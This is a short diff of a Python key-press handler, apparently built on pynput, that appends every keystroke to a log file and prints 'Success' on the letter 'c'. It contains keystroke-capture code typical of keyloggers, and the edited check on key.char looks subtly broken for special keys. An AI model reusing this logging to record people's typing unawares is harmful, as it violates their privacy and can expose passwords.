@@ -30,8 +30,9 @@ def OnKeyPress(key):
 	global mouse_click
 	global last_key 
 	with open(log_file, 'a') as f:
-		if last_key == 'Key.ctrl' and (key == 'c' or key == 'C'):
-			print("Success")
+		#if key == pynput.keyboard.Key.ctrl:
+		if key.char == 'c':
+			print('Success')
 		f.write(f"{key} \n")
 		mouse_click = 0
 
